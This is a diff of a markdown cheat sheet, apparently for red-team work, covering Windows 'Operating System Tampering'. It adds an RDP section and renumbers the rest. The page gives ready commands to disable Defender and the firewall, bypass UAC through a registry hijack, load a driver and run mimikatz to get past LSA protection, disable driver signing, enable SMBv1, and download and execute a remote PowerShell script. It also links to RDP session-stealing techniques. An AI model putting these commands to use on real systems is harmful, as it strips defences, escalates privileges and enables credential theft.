@@ -21,16 +21,17 @@ permalink: /:categories/:title/
 	* 2.4. [PPL status](#PPLstatus)
 * 3. [Operating System Tampering](#OperatingSystemTampering)
 	* 3.1. [configure network ip address](#configurenetworkipaddress)
-	* 3.2. [activate PSRemoting](#activatePSRemoting)
-	* 3.3. [download ps activedirectory module](#downloadpsactivedirectorymodule)
-	* 3.4. [windows defender: disable](#windowsdefender:disable)
-	* 3.5. [windows firewall: disable](#windowsfirewall:disable)
-	* 3.6. [Credential Guard: disable](#CredentialGuard:disable)
-	* 3.7. [PPL: disable](#PPL:disable)
-	* 3.8. [windows uac: bypass](#windowsuac:bypass)
-	* 3.9. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
-	* 3.10. [Windows driver signature: disable](#Windowsdriversignature:disable)
-	* 3.11. [SMBv1: enable](#SMBv1:enable)
+	* 3.2. [activate RDP](#activateRDP)
+	* 3.3. [activate PSRemoting](#activatePSRemoting)
+	* 3.4. [download ps activedirectory module](#downloadpsactivedirectorymodule)
+	* 3.5. [windows defender: disable](#windowsdefender:disable)
+	* 3.6. [windows firewall: disable](#windowsfirewall:disable)
+	* 3.7. [Credential Guard: disable](#CredentialGuard:disable)
+	* 3.8. [PPL: disable](#PPL:disable)
+	* 3.9. [windows uac: bypass](#windowsuac:bypass)
+	* 3.10. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
+	* 3.11. [Windows driver signature: disable](#Windowsdriversignature:disable)
+	* 3.12. [SMBv1: enable](#SMBv1:enable)
 * 4. [Operating System Hardening](#OperatingSystemHardening)
 	* 4.1. [LLMNR: disable](#LLMNR:disable)
 	* 4.2. [MS-MSDT: disable](#MS-MSDT:disable)
@@ -160,7 +161,15 @@ netsh
 interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
 ```
 
-###  3.2. <a name='activatePSRemoting'></a>activate PSRemoting
+###  3.2. <a name='activateRDP'></a>activate RDP
+
+```powershell
+net localgroup "Remote Desktop Users" $zlat_user /add
+```
+
+Learn about session stealing at [hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp#session-stealing)
+
+###  3.3. <a name='activatePSRemoting'></a>activate PSRemoting
 ```powershell
 # client: check winrm service status
 Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
@@ -175,19 +184,19 @@ Set-Item wsman:\localhost\client\trustedhosts -Value *
 Enable-PSRemoting
 ```
 
-###  3.3. <a name='downloadpsactivedirectorymodule'></a>download ps activedirectory module 
+###  3.4. <a name='downloadpsactivedirectorymodule'></a>download ps activedirectory module 
 ```batch
 #version 1
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
 
-###  3.4. <a name='windowsdefender:disable'></a>windows defender: disable
+###  3.5. <a name='windowsdefender:disable'></a>windows defender: disable
 ```batch
 powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 
-###  3.5. <a name='windowsfirewall:disable'></a>windows firewall: disable
+###  3.6. <a name='windowsfirewall:disable'></a>windows firewall: disable
 ```batch
 netsh advfirewall set publicprofile state off
 netsh advfirewall set privateprofile state off
@@ -195,11 +204,11 @@ netsh advfirewall set domainprofile state off
 netsh advfirewall set allprofiles state off
 ```
 
-###  3.6. <a name='CredentialGuard:disable'></a>Credential Guard: disable 
+###  3.7. <a name='CredentialGuard:disable'></a>Credential Guard: disable 
 ```powershell
 ```
 
-###  3.7. <a name='PPL:disable'></a>PPL: disable
+###  3.8. <a name='PPL:disable'></a>PPL: disable
 
 Tools that disable PPL flags on the LSASS process by patching the EPROCESS kernel 
  - [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
@@ -209,25 +218,25 @@ Tools that disable PPL flags on the LSASS process by patching the EPROCESS kerne
 ```batch
 ```
 
-###  3.8. <a name='windowsuac:bypass'></a>windows uac: bypass
+###  3.9. <a name='windowsuac:bypass'></a>windows uac: bypass
 ```batch
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
 ```
 
-###  3.9. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
+###  3.10. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
 ```batch
 powershell .\ConsoleApplication1.exe/InstallDriver
 powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
 powershell .\mimikatz.exe
 ```
 
-###  3.10. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
+###  3.11. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
 ```batch
 bcdedit.exe /set nointegritychecks on
 bcdedit.exe /set testsigning on
 ```
 
-###  3.11. <a name='SMBv1:enable'></a>SMBv1: enable
+###  3.12. <a name='SMBv1:enable'></a>SMBv1: enable
 ```powershell
 # DISM 
 DISM /online /enable-feature /featurename:SMB1Protocol
